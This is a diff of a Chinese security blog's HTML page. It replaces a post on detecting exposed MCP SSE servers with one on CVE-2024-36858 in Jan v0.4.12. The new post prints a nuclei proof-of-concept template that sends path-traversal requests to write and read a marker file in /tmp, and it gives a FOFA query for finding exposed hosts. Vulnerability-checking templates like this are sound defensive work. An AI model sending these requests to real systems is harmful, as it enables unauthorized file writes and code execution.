@@ -19,23 +19,23 @@
   <meta name="author" content="lianccc">
   <meta name="keywords" content="">
   
-    <meta name="description" content="漏洞信息漏洞名称： Exposed MCP SSE API Detection 漏洞类型： 未授权访问 漏洞等级： unknown 漏洞描述： 检测通过SSE API暴露的模型上下文协议（MCP）服务器。MCP服务器通常提供对AI工具、LLM系统或其他自动化基础设施的管理访问。暴露的MCP接口可能导致未经授权的访问、信息泄露和潜在的系统危害。此模板检测SSE服务器事件流并返回可用于POST JSO">
+    <meta name="description" content="漏洞信息漏洞名称： Jan 任意文件上传漏洞 漏洞编号：  CVE： CVE-2024-36858  漏洞类型： 文件上传 漏洞等级： 严重 漏洞描述： Jan v0.4.12中的&#x2F;v1&#x2F;app&#x2F;writeFileSync接口存在任意文件上传漏洞，攻击者可以通过上传特制文件来执行任意代码。 产品厂商： homebrew 产品名称： Jan 影响版本： 0.4.12 搜">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Exposed MCP SSE API Detection">
-<meta property="og:url" content="http://example.com/2025/06/11/github_3269173270/index.html">
+<meta property="og:title" content="Jan 任意文件上传漏洞">
+<meta property="og:url" content="http://example.com/2025/06/14/github_2742521409/index.html">
 <meta property="og:site_name" content="liancc&#39; infos blog">
-<meta property="og:description" content="漏洞信息漏洞名称： Exposed MCP SSE API Detection 漏洞类型： 未授权访问 漏洞等级： unknown 漏洞描述： 检测通过SSE API暴露的模型上下文协议（MCP）服务器。MCP服务器通常提供对AI工具、LLM系统或其他自动化基础设施的管理访问。暴露的MCP接口可能导致未经授权的访问、信息泄露和潜在的系统危害。此模板检测SSE服务器事件流并返回可用于POST JSO">
+<meta property="og:description" content="漏洞信息漏洞名称： Jan 任意文件上传漏洞 漏洞编号：  CVE： CVE-2024-36858  漏洞类型： 文件上传 漏洞等级： 严重 漏洞描述： Jan v0.4.12中的&#x2F;v1&#x2F;app&#x2F;writeFileSync接口存在任意文件上传漏洞，攻击者可以通过上传特制文件来执行任意代码。 产品厂商： homebrew 产品名称： Jan 影响版本： 0.4.12 搜">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-06-11T06:55:05.667Z">
-<meta property="article:modified_time" content="2025-06-11T06:55:05.666Z">
+<meta property="article:published_time" content="2025-06-14T16:00:27.333Z">
+<meta property="article:modified_time" content="2025-06-14T16:00:27.328Z">
 <meta property="article:author" content="lianccc">
 <meta property="article:tag" content="projectdiscovery&#x2F;nuclei-templates:github issues">
-<meta property="article:tag" content="未授权访问">
+<meta property="article:tag" content="文件上传">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>Exposed MCP SSE API Detection - liancc&#39; infos blog</title>
+  <title>Jan 任意文件上传漏洞 - liancc&#39; infos blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -202,7 +202,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Exposed MCP SSE API Detection"></span>
+            <span id="subtitle" data-typed-text="Jan 任意文件上传漏洞"></span>
           
         </div>
 
@@ -213,8 +213,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-06-11 06:55" pubdate>
-          2025年6月11日 早上
+        <time datetime="2025-06-14 16:00" pubdate>
+          2025年6月14日 下午
         </time>
       </span>
     
@@ -225,7 +225,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          259 字
+          461 字
         
       </span>
     
@@ -236,7 +236,7 @@
         
         
         
-          3 分钟
+          4 分钟
         
       </span>
     
@@ -273,19 +273,26 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Exposed MCP SSE API Detection</h1>
+            <h1 id="seo-header">Jan 任意文件上传漏洞</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Exposed MCP SSE API Detection</p>
-<p><strong>漏洞类型：</strong> 未授权访问</p>
-<p><strong>漏洞等级：</strong> unknown</p>
-<p><strong>漏洞描述：</strong> 检测通过SSE API暴露的模型上下文协议（MCP）服务器。MCP服务器通常提供对AI工具、LLM系统或其他自动化基础设施的管理访问。暴露的MCP接口可能导致未经授权的访问、信息泄露和潜在的系统危害。此模板检测SSE服务器事件流并返回可用于POST JSON-RPC 2.0请求的消息端点。</p>
-<p><strong>产品名称：</strong> Model Context Protocol (MCP) servers</p>
-<p><strong>来源：</strong> <a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/nuclei-templates/blob/2873c26fc8962fd77ca7682462af0e6646e94574/http%2Fexposures%2Fapis%2Fexposed-mcp-sse-server.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/2873c26fc8962fd77ca7682462af0e6646e94574/http%2Fexposures%2Fapis%2Fexposed-mcp-sse-server.yaml</a></p>
+                <h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Jan 任意文件上传漏洞</p>
+<p><strong>漏洞编号：</strong></p>
+<ul>
+<li><strong>CVE：</strong> CVE-2024-36858</li>
+</ul>
+<p><strong>漏洞类型：</strong> 文件上传</p>
+<p><strong>漏洞等级：</strong> 严重</p>
+<p><strong>漏洞描述：</strong> Jan v0.4.12中的&#x2F;v1&#x2F;app&#x2F;writeFileSync接口存在任意文件上传漏洞，攻击者可以通过上传特制文件来执行任意代码。</p>
+<p><strong>产品厂商：</strong> homebrew</p>
+<p><strong>产品名称：</strong> Jan</p>
+<p><strong>影响版本：</strong> 0.4.12</p>
+<p><strong>搜索语法：</strong> icon_hash&#x3D;”-165268926”</p>
+<p><strong>来源：</strong> <a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/nuclei-templates/blob/be714ece25958cd225e1d1f9787902e7113a619a/http%2Fcves%2F2024%2FCVE-2024-36858.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/be714ece25958cd225e1d1f9787902e7113a619a/http%2Fcves%2F2024%2FCVE-2024-36858.yaml</a></p>
 <p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p>
-<h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-attribute">id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">exposed-mcp-sse-server</span><br><br><span class="hljs-attribute">info</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Exposed MCP SSE API Detection</span><br>  <span class="hljs-attribute">author</span><span class="hljs-punctuation">:</span> <span class="hljs-string">domwhewell-sage</span><br>  <span class="hljs-attribute">severity</span><span class="hljs-punctuation">:</span> <span class="hljs-string">unknown</span><br>  <span class="hljs-attribute">description</span><span class="hljs-punctuation">:</span> <span class="hljs-string">|</span><br>    <span class="hljs-attribute">Detects exposed Model Context Protocol (MCP) servers through the SSE API.</span><br><span class="hljs-attribute">    MCP servers often provide administrative access to AI tools, LLM systems, or other automation infrastructure.</span><br><span class="hljs-attribute">    Exposed MCP interfaces can lead to unauthorized access, information disclosure, and potential system compromise.</span><br><span class="hljs-attribute">    This template detects a SSE server event stream and returns the messages endpoint which can be used to POST JSON-RPC 2.0 requests.</span><br><span class="hljs-attribute">  metadata</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">verified</span><span class="hljs-punctuation">:</span> <span class="hljs-string">true</span><br>  <span class="hljs-attribute">reference</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://modelcontextprotocol.io/specification/2024-11-05/basic/transports#http-with-sse</span><br>  <span class="hljs-attribute">tags</span><span class="hljs-punctuation">:</span> <span class="hljs-string">mcp,devtools,exposure,api,ai,llm</span><br><br><span class="hljs-attribute">http</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">method: GET</span><br>    <span class="hljs-attribute">path</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;&quot;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/sse&quot;</span><br>    <span class="hljs-attribute">max-size</span><span class="hljs-punctuation">:</span> <span class="hljs-string">100</span><br><br>    <span class="hljs-attribute">matchers-condition</span><span class="hljs-punctuation">:</span> <span class="hljs-string">and</span><br>    <span class="hljs-attribute">matchers</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: status</span><br>        <span class="hljs-attribute">status</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">200</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: word</span><br>        <span class="hljs-attribute">part</span><span class="hljs-punctuation">:</span> <span class="hljs-string">header</span><br>        <span class="hljs-attribute">words</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;text/event-stream&quot;</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: word</span><br>        <span class="hljs-attribute">part</span><span class="hljs-punctuation">:</span> <span class="hljs-string">body</span><br>        <span class="hljs-attribute">words</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;event: endpoint&quot;</span><br><br>    <span class="hljs-attribute">extractors</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: regex</span><br>        <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">message_endpoint</span><br>        <span class="hljs-attribute">regex</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;data: ([/?_=a-zA-Z0-9-]+)&#x27;</span><br><br></code></pre></td></tr></table></figure>
+<h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>4-<span class="hljs-number">36858</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Jan v0.<span class="hljs-number">4.12</span> <span class="hljs-operator">-</span> Arbitrary File Upload<br>  <span class="hljs-params">author:</span> pussycat0x<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    An arbitrary file upload vulnerability <span class="hljs-keyword">in</span> the <span class="hljs-symbol">/v1/app/writeFileSync</span> interface of Jan v0.<span class="hljs-number">4.12</span> allows attackers to execute arbitrary code via uploading a crafted file.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>github.com<span class="hljs-operator">/</span>HackAllSec<span class="hljs-operator">/</span>CVEs<span class="hljs-operator">/</span>blob<span class="hljs-operator">/</span>main<span class="hljs-operator">/</span>Jan%<span class="hljs-number">20</span>AFR%<span class="hljs-number">20</span>vulnerability<span class="hljs-symbol">/README.md</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>4-<span class="hljs-number">36858</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">434</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.0363</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.87242</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:a:homebrew:jan:<span class="hljs-number">0.4</span>.<span class="hljs-number">12</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">fofa-query:</span> icon_hash<span class="hljs-operator">=</span><span class="hljs-string">&quot;-165268926&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2024,kev,totolink,unauth,intrusive<br><br><span class="hljs-params">flow:</span> http(<span class="hljs-number">1</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">2</span>)<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&lt;title&gt;Jan&lt;/title&gt;&quot;</span><br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/v1/app/writeFileSync</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Accept-Encoding:</span> gzip, deflate, br<br>        <span class="hljs-params">Referer:</span> http:<span class="hljs-operator">//</span>&#123;&#123;RootURL&#125;&#125;<br>        <span class="hljs-params">contentType:</span> application<span class="hljs-symbol">/json</span><br>        <span class="hljs-params">Content-Type:</span> text<span class="hljs-symbol">/plain</span>;<span class="hljs-attr">charset</span><span class="hljs-operator">=</span>UTF-<span class="hljs-number">8</span><br>        <span class="hljs-params">Content-Length:</span> <span class="hljs-number">48</span><br>        <span class="hljs-params">Origin:</span> http:<span class="hljs-operator">//</span>&#123;&#123;RootURL&#125;&#125;<br>        <span class="hljs-params">Connection:</span> close<br><br>        [<span class="hljs-string">&quot;/../../../../../tmp/&#123;&#123;randstr&#125;&#125;.txt&quot;</span>,<span class="hljs-string">&quot;&#123;&#123;randstr&#125;&#125;&quot;</span>]<br><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/v1/app/appendFileSync</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Accept-Encoding:</span> gzip, deflate, br<br>        <span class="hljs-params">Referer:</span> http:<span class="hljs-operator">//</span>&#123;&#123;RootURL&#125;&#125;<br>        <span class="hljs-params">contentType:</span> application<span class="hljs-symbol">/json</span><br>        <span class="hljs-params">Content-Type:</span> text<span class="hljs-symbol">/plain</span>;<span class="hljs-attr">charset</span><span class="hljs-operator">=</span>UTF-<span class="hljs-number">8</span><br>        <span class="hljs-params">Content-Length:</span> <span class="hljs-number">48</span><br>        <span class="hljs-params">Origin:</span> http:<span class="hljs-operator">//</span>&#123;&#123;RootURL&#125;&#125;<br>        <span class="hljs-params">Connection:</span> close<br><br>        [<span class="hljs-string">&quot;file:/../../../../../../tmp/&#123;&#123;randstr&#125;&#125;.txt&quot;</span>,<span class="hljs-string">&quot;&#123;&#123;randstr&#125;&#125;&quot;</span>]<br><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/v1/app/readFileSync</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Accept-Encoding:</span> gzip, deflate, br<br>        <span class="hljs-params">Referer:</span> http:<span class="hljs-operator">//</span>&#123;&#123;RootURL&#125;&#125;<br>        <span class="hljs-params">contentType:</span> application<span class="hljs-symbol">/json</span><br>        <span class="hljs-params">Content-Type:</span> text<span class="hljs-symbol">/plain</span>;<span class="hljs-attr">charset</span><span class="hljs-operator">=</span>UTF-<span class="hljs-number">8</span><br>        <span class="hljs-params">Content-Length:</span> <span class="hljs-number">48</span><br>        <span class="hljs-params">Origin:</span> http:<span class="hljs-operator">//</span>&#123;&#123;RootURL&#125;&#125;<br>        <span class="hljs-params">Connection:</span> close<br><br>        [<span class="hljs-string">&quot;file:/../../../../../../tmp/&#123;&#123;randstr&#125;&#125;.txt&quot;</span>,<span class="hljs-string">&quot;utf-8&quot;</span>]<br><br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> &#x27;status_code_1 <span class="hljs-operator">==</span> <span class="hljs-number">200</span> <span class="hljs-operator">&amp;&amp;</span> status_code_2 <span class="hljs-operator">==</span> <span class="hljs-number">200</span> <span class="hljs-operator">&amp;&amp;</span> status_code_3 <span class="hljs-operator">==</span> <span class="hljs-number">200</span>&#x27;<br>          <span class="hljs-operator">-</span> &#x27;contains(body_3, <span class="hljs-string">&quot;&#123;&#123;randstr&#125;&#125;&quot;</span>)&#x27;<br>        <span class="hljs-params">condition:</span> and<br><br><br></code></pre></td></tr></table></figure>
 
 
                 
@@ -322,7 +329,7 @@
       
         <a href="/tags/projectdiscovery-nuclei-templates-github-issues/" class="print-no-link">#projectdiscovery/nuclei-templates:github issues</a>
       
-        <a href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" class="print-no-link">#未授权访问</a>
+        <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="print-no-link">#文件上传</a>
       
     </div>
   
@@ -334,8 +341,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Exposed MCP SSE API Detection</div>
-      <div>http://example.com/2025/06/11/github_3269173270/</div>
+      <div>Jan 任意文件上传漏洞</div>
+      <div>http://example.com/2025/06/14/github_2742521409/</div>
     </div>
     <div class="license-meta">
       
@@ -347,7 +354,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年6月11日</div>
+          <div>2025年6月14日</div>
         </div>
       
       
@@ -379,9 +386,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/06/11/github_3847902675/" title="MongoDB Audit Logging Disabled">
+                      <a href="/2025/06/14/github_3582877377/" title="openSIS-Classic SQL注入漏洞">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">MongoDB Audit Logging Disabled</span>
+                        <span class="hidden-mobile">openSIS-Classic SQL注入漏洞</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -389,8 +396,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/06/11/github_3615026471/" title="Android Trusts User Certificates">
-                        <span class="hidden-mobile">Android Trusts User Certificates</span>
+                      <a href="/2025/06/14/github_1567481502/" title="Cisco IOS Smart Install Buffer Overflow Vulnerability">
+                        <span class="hidden-mobile">Cisco IOS Smart Install Buffer Overflow Vulnerability</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
